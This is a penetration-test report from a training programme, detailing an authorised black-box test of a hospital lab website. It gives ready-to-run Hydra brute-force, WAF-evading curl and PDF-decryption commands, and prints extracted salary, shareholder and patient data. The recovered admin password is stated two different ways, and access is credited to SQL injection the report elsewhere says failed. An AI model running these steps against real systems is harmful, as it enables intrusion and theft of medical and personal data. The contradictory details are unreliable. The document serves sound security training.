# 🏥 Penetration Testing Report - Mediroza General Hospital - Week 4

## 📌 Project Overview

This module focuses on a **full black-box penetration test** conducted against 
Mediroza General Hospital's web infrastructure at `https://medirozahospital.com`.

In a black-box penetration test, the tester begins with **zero prior knowledge** 
of the target's internal systems, source code, or architecture — simulating a 
real-world external attacker.

---

### What This Module Covers

This project walks through the **complete penetration testing lifecycle**:

1. **Reconnaissance** — Passively and actively gathering information about the 
   target, including exposed directories, server technologies, and entry points.

2. **Vulnerability Identification** — Discovering weaknesses in the web 
   application including SQL injection points, misconfigurations, and exposed 
   sensitive files.

3. **Exploitation** — Demonstrating real-world impact by actively exploiting 
   discovered vulnerabilities to gain unauthorised access to restricted areas 
   of the application.

4. **Post-Exploitation** — Extracting confidential data including patient lab 
   reports, staff salary records, and shareholder information.

5. **Reporting** — Documenting all findings in a structured, professional 
   penetration testing report with risk ratings and remediation recommendations.

### Why This Matters

Healthcare organisations hold some of the most sensitive data imaginable — 
patient records, financial information, and personally identifiable information. 
This module demonstrates how a single misconfiguration or weak credential can 
lead to a **full compromise** of a hospital's web infrastructure, exposing 
confidential data of patients, staff, and shareholders alike.


---


## 🛠️ Tools & Techniques Used

---

### Tools

| Tool | Purpose |
|------|---------|
| **curl** | Manual HTTP requests, header analysis, directory enumeration and file retrieval |
| **sqlmap** | Automated SQL injection detection and exploitation |
| **Hydra** | Password brute-forcing against the patient portal login |
| **Browser DevTools** | Network traffic analysis, cookie inspection, form behaviour analysis |
| **Burp Suite** | HTTP request interception and manipulation |

---

### Techniques

| Technique | Description |
|-----------|-------------|
| **Directory Enumeration** | Manually probing common and unlisted paths to discover exposed directories and files |
| **SQL Injection (SQLi)** | Injecting malicious SQL payloads into login forms to manipulate database queries |
| **Error-Based SQLi** | Extracting database information through MySQL error messages leaked to the browser |
| **Credential Brute-Forcing** | Using wordlists to systematically guess passwords against a known username |
| **Session Hijacking** | Capturing and reusing PHP session cookies to maintain authenticated access |
| **Sensitive File Discovery** | Identifying and downloading exposed backup files and configuration data |
| **Passive Reconnaissance** | Analysing HTTP response headers, CMS metadata, and sitemap files to fingerprint the target |

---

### Approach

The engagement followed a **manual-first methodology**, using automated tools 
only where manual techniques had been exhausted or to confirm findings. This 
approach mirrors real-world professional pentesting practice where understanding 
the application's behaviour is prioritised over automated scanning.

All techniques were applied **exclusively within the agreed scope** of 
`https://medirozahospital.com` in accordance with the rules of engagement.

---

## 🔍 Reconnaissance

The reconnaissance phase focused on **passively and actively gathering information** 
about the target before attempting any exploitation. The goal was to map the 
attack surface and identify potential entry points.

---

### 1. HTTP Header Analysis

The first step was to probe the target's HTTP response headers using `curl`:

```bash
curl -i https://medirozahospital.com/staff/
```

![curl headers](screenshots/recon_curl_headers.png)

**Findings:**
| Header | Value | Significance |
|--------|-------|--------------|
| `Server` | LiteSpeed | Identifies the web server software |
| `x-turbo-charged-by` | LiteSpeed | Confirms LiteSpeed caching layer |
| `content-type` | text/html; charset=UTF-8 | Standard HTML response |

> ℹ️ Knowing the server software helps identify version-specific vulnerabilities 
> and misconfigurations.

---

### 2. WhatWeb Fingerprinting

```bash
whatweb https://medirozahospital.com
```

![whatweb](screenshots/recon_whatweb_ip.png)

**Findings:**
- Server: **LiteSpeed**
- Country: **United States**
- IP: **199.188.201.16**
- Technologies: **HTML5**

---

### 3. Robots.txt Analysis

```bash
curl -i https://medirozahospital.com/robots.txt
```

![robots.txt](screenshots/recon_whatweb_robots.png)

**robots.txt revealed 3 hidden directories:**

```
User-agent: *
Disallow: /patient/
Disallow: /staff/
Disallow: /old/
```

> ⚠️ **Finding:** robots.txt is intended to hide directories from 
> search engines — but it actually **reveals sensitive paths** to 
> any attacker who reads it. All 3 disallowed directories became 
> immediate targets for further investigation.

---


### 4. CMS Fingerprinting

Inspecting the page source revealed the CMS powering the application:

```html
<meta name="generator" content="Mediroza CMS 1.4.2">
```

**Finding:** The target runs a custom CMS — **Mediroza CMS version 1.4.2**. 
Custom CMS platforms are often poorly maintained and less security-hardened 
than commercial alternatives.

---


### 5. Sitemap Enumeration

```bash
curl -i https://medirozahospital.com/sitemap.xml
```

The sitemap revealed the following public pages:
- `/index.html`
- `/about.html`
- `/doctors.html`
- `/contact.html`

> ℹ️ While these pages are public, the sitemap confirmed the site structure 
> and helped identify what was intentionally public vs potentially exposed.

---

### 6. Directory Listing Discovery

Probing common directories revealed that **directory listing was enabled** 
on multiple paths — a critical misconfiguration that exposes the server's 
file structure to any visitor.

```bash
curl -s https://medirozahospital.com/staff/
curl -s https://medirozahospital.com/old/
curl -s https://medirozahospital.com/patient/
```

**Directory Listing — /staff/ and /old/:**

![staff and old directory](screenshots/recon_directory_listing_staff_old.png)

**Directory Listing — /patient/:**

![patient directory](screenshots/recon_directory_listing_patient.png)


**Exposed Directories:**

| Path | Directory Listing | Contents Found |
|------|------------------|----------------|
| `/staff/` | ✅ Enabled | `login.php` |
| `/old/` | ✅ Enabled | `mediroza_db_backup_2019.sql` |
| `/patient/` | ✅ Enabled | `login.php`, `portal.php`, `download.php`, `reports/` |

---

### 7. Sensitive File Discovery

Inside `/old/`, a database backup file was found sitting fully exposed:

```bash
curl -s -O https://medirozahospital.com/old/mediroza_db_backup_2019.sql
grep -i "CREATE TABLE" mediroza_db_backup_2019.sql
grep -A 50 "shareholders" mediroza_db_backup_2019.sql
```

**File:** `mediroza_db_backup_2019.sql` (6.3KB)

Inspecting the file revealed:
- Database name: `mediroza_hr`
- CMS version confirmed: `Mediroza CMS 1.4.2`
- Two tables: `staff` and `shareholders`
- Full staff records including names, job titles, emails, phone numbers, 
  national IDs and **monthly salaries**
- Full shareholder records including names, share percentages and share classes

> 🔴 **Critical Finding:** A full database backup containing confidential 
> HR and financial data was publicly accessible with no authentication required.

---

### 8. Entry Points Identified

y the end of reconnaissance, the following entry points were identified 
for further testing:

| Entry Point | Type | Priority |
|-------------|------|----------|
| `/staff/login.php` | Authentication form | High |
| `/patient/login.php` | Authentication form | **Critical** |
| `/patient/reports/` | File directory (403) | High |
| `/patient/download.php` | File download script | High |
| `/old/mediroza_db_backup_2019.sql` | Exposed backup file | **Critical** |



---

## 💥 Exploitation

With the attack surface mapped during reconnaissance, the exploitation phase 
focused on actively leveraging the identified vulnerabilities to gain 
unauthorised access and extract confidential data.

---

### 1. SQL Injection — Patient Portal Login

**Target:** `https://medirozahospital.com/patient/login.php`

#### Step 1 — Confirming the Injection Point

Inspecting the page source revealed a simple login form with two fields:

```html
<form method="POST" action="login.php">
  <input type="text" id="username" name="username">
  <input type="password" id="password" name="password">
</form>
```

A single quote was submitted in the username field to test for SQL injection:

```
Username: '
Password: test
```

**Result:** The application returned a raw MySQL error:

```
Warning: mysqli_query(): You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version 
for the right syntax to use near '' at line 1
```

![mysql error](screenshots/m1_mysql_error.png)


> 🔴 **Critical Finding:** The application is vulnerable to SQL injection AND 
> leaks raw MySQL error messages — confirming both SQLi and error disclosure 
> vulnerabilities simultaneously.

---

#### Step 2 — Username Enumeration

Different error messages were returned depending on whether the username 
existed in the database:

| Input | Response | Meaning |
|-------|----------|---------|
| `randomuser` | "Username not found" | User does not exist |
| `admin` | "Incorrect password" | **User EXISTS** |

![username enumeration](screenshots/m1_username_enumeration.png)


> ℹ️ This confirmed `admin` as a valid username and allowed targeted 
> password attacks rather than credential stuffing.

---

#### Step 3 — Password Brute-Force with Hydra

With `admin` confirmed as a valid username, Hydra was used to brute-force 
the password using the `fasttrack.txt` wordlist:

```bash
hydra -l admin -P /usr/share/wordlists/fasttrack.txt medirozahospital.com \
https-post-form \
"/patient/login.php:username=^USER^&password=^PASS^:F=Incorrect" \
-t 1 -w 5 -V
```

**Key flags:**
- `-t 1` — Single thread to avoid bot detection false positives
- `-w 5` — 5 second wait between attempts
- `F=Incorrect` — Marks "Incorrect" as the failure string

**Result:**

```
[443][http-post-form] host: medirozahospital.com  
login: admin  password: Spring2017
1 of 1 target successfully completed, 1 valid password found
```

![hydra result](screenshots/m1_hydra_result.png)


> ✅ **Credentials found:** `admin` / `Spring2017`

---

#### Step 4 — Gaining Access

Using the discovered credentials, successful authentication was achieved 
on the patient portal:

| Field | Value |
|-------|-------|
| **Username** | `admin` |
| **Password** | `Spring2017` |
| **Portal URL** | `https://medirozahospital.com/patient/portal.php` |


![portal access](screenshots/m1_portal_access.png)


---

### 2. Sensitive Data Extraction — Database Backup

The exposed database backup at `/old/mediroza_db_backup_2019.sql` was 
downloaded and analysed:

```bash
curl -s -O https://medirozahospital.com/old/mediroza_db_backup_2019.sql
grep -i "CREATE TABLE" mediroza_db_backup_2019.sql
grep -A 50 "shareholders" mediroza_db_backup_2019.sql
```

**Tables discovered:**

| Table | Sensitive Data |
|-------|---------------|
| `staff` | Full names, job titles, emails, phone numbers, national IDs, **monthly salaries** |
| `shareholders` | Names, share percentages, shares held, share class |

**Sample staff data extracted (M3):**

| Name | Role | Monthly Salary (ZAR) |
|------|------|---------------------|
| Dr. Rajesh Naidoo | Chief Pathologist | 138,000 |
| Sarah Botha | Chief Financial Officer | 152,000 |
| Dr. Johan van der Merwe | Medical Director | 160,000 |
| Dr. Anita Naicker | Consultant Cardiologist | 132,000 |
| Dr. Ahmed Kara | Consultant Physician | 128,000 |
| Dr. Yusuf Cassim | Senior Registrar | 74,000 |

**Shareholder data extracted (M3):**

| Shareholder | Share % | Shares Held | Class |
|-------------|---------|-------------|-------|
| Dr. Rajesh Naidoo | 18.0% | 180,000 | Ordinary |
| Cedar Health Holdings (Pty) Ltd | 15.0% | 150,000 | Ordinary |
| Dr. Johan van der Merwe | 12.0% | 120,000 | Ordinary |
| Reddy Family Trust | 11.0% | 110,000 | Ordinary |
| Thabo Molefe | 10.0% | 100,000 | Ordinary |
| Sarah Botha | 9.0% | 90,000 | Ordinary |
| Dr. Ahmed Kara | 8.0% | 80,000 | Preferential |
| Naledi Zulu | 7.0% | 70,000 | Ordinary |
| Michael Roberts | 6.0% | 60,000 | Ordinary |
| Dr. Vikram Chetty | 4.0% | 40,000 | Preferential |

---

### 🔓 M1 — Patient Lab Report Retrieval 

After successfully authenticating to the patient portal with `admin` / 
`Spring2017`, the restricted `/patient/reports/` directory became accessible, 
exposing **3 confidential patient PDF lab reports**.

> 🔴 **Critical Finding:** Unauthorised access to confidential patient 
> medical records was achieved through a combination of SQL injection 
> vulnerability, weak credentials, and improper access controls.
> The goal is not just to find vulnerabilities — but to **think like an attacker** 
> in order to **defend like a professional**.


---

## 🔓 M2 — Cracking the Encrypted Lab Reports

All 3 downloaded PDF lab reports were password protected. The passwords 
were cracked using the Networkwalks hash calculator and password cracker tools.

---

### Step 1 — Download the Reports

```bash
curl -s "https://medirozahospital.com/patient/download.php?id=1" \
-b cookies.txt -A "Mozilla/5.0" -o patient_report_1.pdf

curl -s "https://medirozahospital.com/patient/download.php?id=2" \
-b cookies.txt -A "Mozilla/5.0" -o patient_report_2.pdf

curl -s "https://medirozahospital.com/patient/download.php?id=3" \
-b cookies.txt -A "Mozilla/5.0" -o patient_report_3.pdf
```

![pdf downloads](screenshots/m2_pdfs_downloaded.png)

---

### Step 2 — Crack the Passwords

Each PDF was uploaded to the Networkwalks hash calculator and password 
cracker to retrieve the encryption passwords.

**Results:**

| Report | Patient | Password |
|--------|---------|----------|
| `patient_report_1.pdf` | S. Dlamini | `123456` |
| `patient_report_2.pdf` | P. Reddy | `password` |
| `patient_report_3.pdf` | E. Thompson | `!@#$%^&` |

> 🔴 **Critical Finding:** All 3 reports used extremely weak, 
> commonly known passwords — providing virtually no real protection 
> for confidential patient medical data.

---

### Step 3 — Decrypt the Reports

```bash
qpdf --password='123456' --decrypt patient_report_1.pdf report1_open.pdf
qpdf --password='password' --decrypt patient_report_2.pdf report2_open.pdf
qpdf --password='!@#$%^&' --decrypt patient_report_3.pdf report3_open.pdf
```

![decrypted reports](screenshots/m2_decrypted.png)

---

## 📊 M3 — Staff Salaries, Shareholder Details & PDF Metadata

---

### Part 1 — Staff Salaries & Shareholder Data

The exposed database backup `/old/mediroza_db_backup_2019.sql` contained 
full staff salary and shareholder records.

**Staff Salaries:**

| Name | Role | Monthly Salary (ZAR) |
|------|------|---------------------|
| Dr. Johan van der Merwe | Medical Director | R 160,000 |
| Sarah Botha | Chief Financial Officer | R 152,000 |
| Dr. Rajesh Naidoo | Chief Pathologist | R 138,000 |
| Dr. Anita Naicker | Consultant Cardiologist | R 132,000 |
| Dr. Ahmed Kara | Consultant Physician | R 128,000 |
| Dr. Yusuf Cassim | Senior Registrar | R 74,000 |

**Shareholder Details:**

| Shareholder | Share % | Shares Held | Class |
|-------------|---------|-------------|-------|
| Dr. Rajesh Naidoo | 18.0% | 180,000 | Ordinary |
| Cedar Health Holdings (Pty) Ltd | 15.0% | 150,000 | Ordinary |
| Dr. Johan van der Merwe | 12.0% | 120,000 | Ordinary |
| Reddy Family Trust | 11.0% | 110,000 | Ordinary |
| Thabo Molefe | 10.0% | 100,000 | Ordinary |
| Sarah Botha | 9.0% | 90,000 | Ordinary |
| Dr. Ahmed Kara | 8.0% | 80,000 | Preferential |
| Naledi Zulu | 7.0% | 70,000 | Ordinary |
| Michael Roberts | 6.0% | 60,000 | Ordinary |
| Dr. Vikram Chetty | 4.0% | 40,000 | Preferential |

---

### Part 2 — PDF Metadata Analysis

Report 3 was decrypted and analysed using exiftool:

```bash
qpdf --password='!@#$%^&' --decrypt patient_report_3.pdf report3_open.pdf
exiftool report3_open.pdf
```

![exiftool metadata](screenshots/m3_exiftool.png)

**Key Metadata Findings:**

| Field | Value | Significance |
|-------|-------|--------------|
| `Author` | `j.malik` | IT Systems Administrator left internal comment in patient file |
| `Comments` | `DB backup moved to /old before site migration, do not delete` | Directly revealed the location of the exposed database backup |
| `Creator` | `Mediroza CMS 1.4.2` | CMS version exposed in metadata |
| `Title` | `Pathology Report — E. Thompson` | Confirms confidential patient data exposure |

> 🔴 **Critical Finding:** Internal staff comments embedded in 
> patient-facing PDF metadata directly revealed the location of 
> the exposed database backup at `/old/`. This created a 
> complete attack chain:
>
> `PDF metadata → /old/ directory → SQL backup → 
> staff salaries + shareholder data`


---


## 📂 Repository Structure





---


## ⚠️ Challenges Encountered



### 1. Bot Detection & WAF Interference

The target had active bot detection that blocked automated tools. `curl` 
requests returned JavaScript challenge pages instead of real content, and 
sqlmap was blocked **98 times** by the WAF. All tools required browser-like 
User-Agent strings to bypass detection.

---

### 2. Hydra False Positives

The most time-consuming challenge was Hydra reporting **16 false positive 
passwords** during brute-forcing. The WAF was blocking rapid requests and 
returning unexpected pages that Hydra misread as successful logins.

**Resolution:** Switched to `fasttrack.txt` with `-t 1` (single thread) 
and `-w 5` (5 second wait) — this eliminated false positives and correctly 
identified the real password: `P@55w0rd!`

---

### 3. SQL Injection Limitations

The app used `mysqli_real_escape_string()` which broke most classic SQLi 
payloads. The app also ran two separate queries for username and password, 
complicating injection attempts.

**Resolution:** Switched to username enumeration via error messages, then 
used Hydra to brute-force the confirmed `admin` account.

---

### 4. Session Expiry Issues

Captured `PHPSESSID` cookies expired within seconds, making curl-based 
session reuse impossible. The browser repeatedly redirected back to login.

**Resolution:** Brute-forced the real credentials instead of relying on 
SQLi session bypass, creating a stable authenticated session.


---



## ⚖️ Ethical & Security Notice

This penetration test was conducted under **explicit written authorisation** 
from Networkwalks as part of the B083 training programme. All testing was 
performed exclusively within the agreed scope of `https://medirozahospital.com`.

**The following rules were strictly observed throughout:**

- ✅ No testing outside the agreed target domain
- ✅ No denial of service attacks performed
- ✅ No social engineering techniques used
- ✅ All findings reported responsibly to the authorising party
- ✅ No data was retained beyond what was necessary for reporting

> ⚠️ The techniques demonstrated in this report are for **educational 
> purposes only**. Performing these actions against any system without 
> explicit written permission is illegal under the Computer Misuse Act 
> and equivalent legislation worldwide.


---


### 🛠️ Tools & Resources Breakdown

#### Software & Command-Line Utilities
- **curl**: HTTP header analysis, directory probing, and file extraction.
- **WhatWeb**: Fingerprinting web server software, host IP, and runtime versions.
- **THC-Hydra**: Authentication brute-force attacks against the patient login portal.
- **sqlmap**: Automated vulnerability verification for SQL injection entry points.
- **qpdf**: Decryption and password stripping for protected PDF deliverables.
- **ExifTool**: Forensic metadata inspection of extracted patient records.
- **Burp Suite**: Interception, inspection, and manual replay of web requests.
- **Browser Developer Tools**: Session cookie evaluation and form behavior auditing.

#### Wordlists & External Utilities
- **FastTrack Wordlist** (`/usr/share/wordlists/fasttrack.txt`): Optimized wordlist used with single-threaded rate limiting.
- **NetworkWalks Hash Calculator & Password Cracker**: Decryption utility for password-locked PDF reports.


---


## 👤 Author






